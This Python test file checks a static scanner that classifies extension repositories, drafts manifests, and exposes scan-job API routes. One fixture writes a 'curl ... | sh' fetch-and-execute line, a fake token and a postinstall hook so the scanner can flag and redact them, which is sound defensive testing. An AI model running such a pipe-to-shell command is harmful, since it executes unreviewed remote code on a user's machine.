"""MAD-914: staged static repository scan pipeline."""

import asyncio
import json
import shutil
import time
from pathlib import Path

import pytest
from fastapi import HTTPException

from src.authority_protocol import AuthorityStore
from src.extension_capability_inventory import validate_scan_artifact
from src.extension_installer import ExtensionLifecycleManager
from src.extension_registry import ExtensionRegistry, validate_extension_manifest
from src.extension_scan import (
    ExtensionScanError,
    ExtensionStaticScanner,
    get_scan,
    reset_scan_jobs,
    start_scan,
)


SOURCE_URL = "https://github.com/example/demo-tools.git"
REVISION = "a" * 40


class _CopyGitClient:
    """Offline git seam: copies a prepared tree into the scan staging dir."""

    def __init__(self, source_dir: Path, revision: str = REVISION):
        self.source_dir = source_dir
        self.revision = revision

    def resolve_revision(self, source_url, requested_ref):
        return source_url, requested_ref or "HEAD", self.revision

    def checkout(self, source, ref, revision, destination):
        shutil.copytree(self.source_dir, destination)


def _write(root: Path, relative: str, content: str) -> None:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _scanner(tmp_path: Path, source_dir: Path, **kwargs) -> ExtensionStaticScanner:
    return ExtensionStaticScanner(
        git_client=_CopyGitClient(source_dir),
        staging_root=tmp_path / "managed",
        data_dir=tmp_path / "scans",
        clock=time.monotonic,
        **kwargs,
    )


def _staging_empty(tmp_path: Path) -> bool:
    staging = tmp_path / "managed" / "staging"
    return not staging.exists() or not any(staging.iterdir())


def test_scan_python_cli_reports_capabilities_dependencies_and_draft(tmp_path):
    source = tmp_path / "source"
    _write(source, "pyproject.toml", (
        "[project]\n"
        'name = "demo-tools"\n'
        'version = "1.2.3"\n'
        'dependencies = ["httpx>=0.27"]\n'
        "\n"
        "[project.scripts]\n"
        'demo = "demo:main"\n'
    ))
    _write(source, "LICENSE", "MIT License\n\nPermission is hereby granted, free of charge...")
    _write(source, "README.md", "# Demo")
    _write(source, "demo.py", "def main():\n    return 0\n")

    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    validated = validate_scan_artifact(artifact, require_complete=True)
    assert validated["repo_class"] == "python_cli"
    assert [item["name"] for item in validated["capabilities"]] == ["demo"]
    assert {
        "ecosystem": "pypi",
        "name": "httpx",
        "version": ">=0.27",
    } in validated["dependencies"]
    assert validated["licenses"] == ["MIT"]
    assert validated["executed_repo_commands"] == []
    assert validated["draft_manifest"] is not None
    draft = validate_extension_manifest(validated["draft_manifest"])
    assert draft["runtime"]["type"] == "service"
    assert draft["capabilities"]["descriptor"]["type"] == "inline"
    assert _staging_empty(tmp_path)


def test_scan_skill_bundle_extracts_skills_and_draft(tmp_path):
    source = tmp_path / "source"
    _write(
        source,
        "skills/pdf-tools/SKILL.md",
        "---\nname: pdf-tools\ndescription: Tools for working with PDFs\n---\n# PDF tools\n",
    )

    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    assert artifact["repo_class"] == "skill_bundle"
    assert [
        (item["name"], item["kind"], item["descriptor"])
        for item in artifact["capabilities"]
    ] == [("pdf-tools", "skill", "skill_bundle")]
    draft = validate_extension_manifest(artifact["draft_manifest"])
    assert draft["runtime"]["entrypoint"] == "skills/pdf-tools/SKILL.md"
    assert draft["capabilities"]["descriptor"] == {
        "type": "skill_bundle",
        "format": "agent_skill",
        "include": ["pdf-tools"],
    }


def test_scan_skill_bundle_descriptor_draft_marks_unimportable_skills(tmp_path):
    source = tmp_path / "source"
    _write(
        source,
        ".codex-plugin/plugin.json",
        json.dumps({"name": "bundle", "skills": "./skills/"}),
    )
    for name in ("alpha-skill", "beta-skill", "raw-skill"):
        _write(
            source,
            f"skills/{name}/SKILL.md",
            f"---\nname: {name}\ndescription: Run the {name} workflow\n---\n# Procedure\n\n1. Do it.\n",
        )
    binary = source / "skills" / "raw-skill" / "data.bin"
    binary.write_bytes(b"\x00\x01\x02")

    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    draft = validate_extension_manifest(artifact["draft_manifest"])
    assert draft["runtime"]["entrypoint"] == ".codex-plugin/plugin.json"
    descriptor = draft["capabilities"]["descriptor"]
    assert descriptor["format"] == "codex_plugin"
    assert descriptor["include"] == ["alpha-skill", "beta-skill"]
    findings = {item["id"]: item for item in artifact["findings"]}
    assert findings["skill-assets-excluded"]["category"] == "skill_asset"
    assert "raw-skill" in findings["skill-assets-excluded"]["evidence"]
    assert _staging_empty(tmp_path)


def test_scan_skill_bundle_draft_matches_installer_admission(tmp_path):
    source = tmp_path / "source"
    _write(
        source,
        ".codex-plugin/plugin.json",
        json.dumps({"name": "bundle", "skills": "./skills/"}),
    )
    _write(
        source,
        "skills/folded-skill/SKILL.md",
        (
            "---\n"
            "name: folded-skill\n"
            "description: >\n"
            "  Folded summary across\n"
            "  two lines.\n"
            "---\n\n"
            "# Procedure\n\n1. Do it.\n"
        ),
    )
    _write(
        source,
        "skills/unsupported-skill/SKILL.md",
        (
            "---\n"
            "name: unsupported-skill\n"
            "description: Declares authority metadata the installer rejects\n"
            "owner: another-user\n"
            "---\n\n"
            "# Procedure\n\n1. Do it.\n"
        ),
    )

    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    draft = validate_extension_manifest(artifact["draft_manifest"])
    descriptor = draft["capabilities"]["descriptor"]
    assert descriptor["include"] == ["folded-skill"]
    findings = {item["id"]: item for item in artifact["findings"]}
    assert "unsupported-skill" in findings["skill-assets-excluded"]["evidence"]
    assert _staging_empty(tmp_path)


def test_scan_skill_bundle_without_descriptor_or_single_skill_has_no_draft(tmp_path):
    source = tmp_path / "source"
    for name in ("alpha-skill", "beta-skill"):
        _write(
            source,
            f"skills/{name}/SKILL.md",
            f"---\nname: {name}\ndescription: Run the {name} workflow\n---\n# Procedure\n\n1. Do it.\n",
        )

    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    assert artifact["repo_class"] == "skill_bundle"
    assert artifact["draft_manifest"] is None


def test_scan_findings_are_redacted_and_bounds_fail_closed(tmp_path):
    source = tmp_path / "source"
    _write(source, "package.json", json.dumps({
        "name": "risky-tools",
        "scripts": {"postinstall": "node install.js"},
        "dependencies": {"left-pad": "1.0.0"},
    }))
    _write(source, "deploy.sh", (
        "curl https://example.com/install.sh | sh\n"
        'token = "abcdefghijklmnopqrstuvwxyz"\n'
    ))

    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    categories = {item["category"] for item in artifact["findings"]}
    assert {"dangerous_pattern", "secret", "postinstall"} <= categories
    dumped = json.dumps(artifact)
    assert "abcdefghijklmnopqrstuvwxyz" not in dumped
    assert "redacted" in dumped

    tiny = _scanner(tmp_path, source, max_files=0)
    with pytest.raises(ExtensionScanError, match="extension_scan_bounds_exceeded"):
        tiny.run(SOURCE_URL, "HEAD", operator_id="operator")
    assert _staging_empty(tmp_path)


def test_scan_job_lifecycle_and_routes(tmp_path, monkeypatch):
    import routes.extension_routes as extension_routes

    source = tmp_path / "source"
    _write(source, "README.md", "# Nothing to classify")
    reset_scan_jobs()

    job = start_scan(
        SOURCE_URL, "HEAD", operator_id="operator", scanner=_scanner(tmp_path, source)
    )
    record = job
    deadline = time.time() + 10
    while time.time() < deadline:
        record = get_scan(job["scan_id"]) or record
        if record["status"] in {"succeeded", "failed"}:
            break
        time.sleep(0.02)

    assert record["status"] == "succeeded", record
    assert record["progress"] == 100
    assert record["artifact"]["repo_class"] == "unknown"
    assert record["artifact"]["draft_manifest"] is None

    manager = ExtensionLifecycleManager(
        root=tmp_path / "manager",
        registry=ExtensionRegistry(tmp_path / "registry.json"),
        authority=AuthorityStore(tmp_path / "authority.json"),
    )
    routes = {
        route.path: route
        for route in extension_routes.setup_extension_routes(
            manager, marketplace_loader=lambda: None
        ).routes
    }
    monkeypatch.setattr(
        extension_routes, "start_scan",
        lambda *args, **kwargs: {"scan_id": "scan-1", "status": "queued"},
    )
    monkeypatch.setattr(
        extension_routes, "get_scan",
        lambda scan_id: {"scan_id": scan_id, "status": "succeeded"}
        if scan_id == "scan-1" else None,
    )

    started = asyncio.run(
        routes["/api/extensions/scans"].endpoint(
            payload=extension_routes.SourceScanRequest(source_url=SOURCE_URL),
            owner="operator",
        )
    )
    assert started["scan_id"] == "scan-1"
    status = asyncio.run(
        routes["/api/extensions/scans/{scan_id}"].endpoint(
            scan_id="scan-1", owner="operator"
        )
    )
    assert status["status"] == "succeeded"
    with pytest.raises(HTTPException) as exc:
        asyncio.run(
            routes["/api/extensions/scans/{scan_id}"].endpoint(
                scan_id="missing", owner="operator"
            )
        )
    assert exc.value.status_code == 404


def test_source_plan_route_passes_stored_scan_draft(tmp_path, monkeypatch):
    import routes.extension_routes as extension_routes

    source = tmp_path / "source"
    _write(
        source,
        "skills/pdf-tools/SKILL.md",
        "---\nname: pdf-tools\ndescription: Tools for working with PDFs\n---\n# PDF tools\n",
    )
    artifact = _scanner(tmp_path, source).run(SOURCE_URL, "HEAD", operator_id="operator")

    captured = {}

    class Manager:
        adapters = ()

        @staticmethod
        def preview_source(*args, **kwargs):
            captured["args"] = args
            captured["kwargs"] = kwargs
            return {"plan_id": "plan-1", "status": "pending_approval"}

    routes = {
        route.path: route
        for route in extension_routes.setup_extension_routes(
            Manager(), marketplace_loader=lambda: None
        ).routes
    }
    monkeypatch.setattr(
        extension_routes,
        "get_scan",
        lambda scan_id: {
            "scan_id": scan_id,
            "status": "succeeded",
            "artifact": artifact,
        }
        if scan_id == "scan-0001"
        else None,
    )

    payload = extension_routes.SourcePlanRequest(
        operation="install",
        source_url=SOURCE_URL,
        ref=artifact["source_revision"],
        scan_id="scan-0001",
    )
    result = asyncio.run(
        routes["/api/extensions/plans/source"].endpoint(payload=payload, owner="operator")
    )
    assert result == {"plan_id": "plan-1", "status": "pending_approval"}
    assert captured["kwargs"]["draft_manifest"] == artifact["draft_manifest"]
    assert captured["kwargs"]["scan_revision"] == artifact["source_revision"]

    wrong_source = extension_routes.SourcePlanRequest(
        operation="install",
        source_url="https://github.com/example/other-tools.git",
        ref=artifact["source_revision"],
        scan_id="scan-0001",
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(
            routes["/api/extensions/plans/source"].endpoint(
                payload=wrong_source, owner="operator"
            )
        )
    assert exc.value.status_code == 400
    assert exc.value.detail == "extension_scan_source_mismatch"

    missing_scan = extension_routes.SourcePlanRequest(
        operation="install",
        source_url=SOURCE_URL,
        ref=artifact["source_revision"],
        scan_id="missing-scan",
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(
            routes["/api/extensions/plans/source"].endpoint(
                payload=missing_scan, owner="operator"
            )
        )
    assert exc.value.status_code == 404
    assert exc.value.detail == "extension_scan_not_found"
